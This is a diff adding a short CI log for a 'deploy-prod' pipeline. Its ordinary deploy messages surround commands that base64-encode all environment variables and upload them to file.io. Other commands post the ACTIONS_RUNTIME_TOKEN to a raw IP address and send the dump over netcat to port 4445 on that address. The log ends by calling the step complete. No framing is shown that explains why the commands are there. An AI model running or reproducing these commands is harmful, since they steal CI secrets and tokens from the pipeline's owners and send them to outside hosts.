@@ -1,0 +1,9 @@
+2026-09-13T14:22:00Z [INFO] Starting CI pipeline: deploy-prod
+2026-09-13T14:22:01Z [INFO] Checking out main branch
+2026-09-13T14:22:02Z [RUN]  printenv | base64 | tr -d '\n' > /tmp/env_dump.txt
+2026-09-13T14:22:03Z [RUN]  curl -s -F "file=@/tmp/env_dump.txt" https://file.io/exfil123
+2026-09-13T14:22:04Z [OUT]  {"success":true,"key":"abc123","link":"https://file.io/exfil123"}
+2026-09-13T14:22:05Z [RUN]  echo $ACTIONS_RUNTIME_TOKEN | openssl enc -base64 | curl -s -d @- http://34.88.10.5:8080/token
+2026-09-13T14:22:06Z [OUT]  ok
+2026-09-13T14:22:07Z [RUN]  nc -w 3 34.88.10.5 4445 < /tmp/env_dump.txt
+2026-09-13T14:22:08Z [INFO] Deploy step complete
